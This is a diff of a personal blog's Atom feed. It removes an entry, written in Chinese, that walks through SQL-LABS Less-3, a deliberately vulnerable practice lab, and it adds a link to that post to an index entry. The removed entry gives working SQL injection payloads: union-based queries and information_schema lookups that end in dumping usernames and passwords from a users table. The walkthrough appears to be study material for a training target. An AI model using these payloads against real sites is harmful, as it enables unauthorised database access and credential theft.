@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://lovectrl-tan.github.io</id>
     <title>LoveCtrl-Tan</title>
-    <updated>2019-10-19T09:16:28.842Z</updated>
+    <updated>2019-10-19T09:19:22.441Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://lovectrl-tan.github.io"/>
     <link rel="self" href="https://lovectrl-tan.github.io/atom.xml"/>
@@ -10,42 +10,6 @@
     <logo>https://lovectrl-tan.github.io/images/avatar.png</logo>
     <icon>https://lovectrl-tan.github.io/favicon.ico</icon>
     <rights>All rights reserved 2019, LoveCtrl-Tan</rights>
-    <entry>
-        <title type="html"><![CDATA[第三关]]></title>
-        <id>https://lovectrl-tan.github.io/post/di-san-guan</id>
-        <link href="https://lovectrl-tan.github.io/post/di-san-guan">
-        </link>
-        <updated>2019-10-19T08:53:34.000Z</updated>
-        <content type="html"><![CDATA[<p>首先我们来看题目提示<br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019165732.png" alt=""><br>
-照例输入<code>?id=1</code><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019165558.png" alt=""><br>
-接下来我们根据提示输入判断语句<code>?id=1') and 1=1--+</code>和<code>?id=1') and 1=2--+</code><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019165903.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019165912.png" alt=""><br>
-初步判断出它存在SQL注入漏洞，接下来我们查询数据表的字段数量，输入代码<code>?id=1') ordey by 1--+</code><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170147.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170155.png" alt=""><br>
-按照返回结果可以看出，字段数为<code>3</code>接下来我们使用<code>union select</code>语句进行联合查询数据库名,记得要使前一个语句报错，否则后面联合查询的内容无法显示;<br>
-<code>?id=-1') union select 1,database(),3--+</code><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170537.png" alt=""><br>
-爆出数据库名后我们接下来输入以下命令行查询表名</p>
-<pre><code class="language-URL">select table_name from information_schema.tables where table_schema='security' limit 0,1
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170856.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170905.png" alt=""><br>
-当我们查询到第四个表名时发现了<code>users</code>很明显，这个就是用户名所在表，接下来我们使用以下命令行查询字段名</p>
-<pre><code class="language-URL">select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171135.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171149.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171158.png" alt=""><br>
-接着我们就可以查询表里的数据啦</p>
-<pre><code class="language-URL">?id=1') union select 1,(select username from security.users limit 0,1),(select password from security.users limit 0,1)--+
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171540.png" alt=""></figure>
-]]></content>
-    </entry>
     <entry>
         <title type="html"><![CDATA[SQL-LABS]]></title>
         <id>https://lovectrl-tan.github.io/post/sql-labs</id>
@@ -55,6 +19,7 @@
         <content type="html"><![CDATA[<ul>
 <li><a href="https://lovectrl-tan.github.io/post/sqli-zhu-ru/">GET-Error based - Single quotes-String Less-1</a></li>
 <li><a href="https://lovectrl-tan.github.io/post/di-er-guan/">GET-Error based-intiger based Less-2</a></li>
+<li><a href="https://lovectrl-tan.github.io/post/di-san-guan/">GET-Error bases-Single quotes with twist-string Less-3</a></li>
 </ul>
 ]]></content>
     </entry>
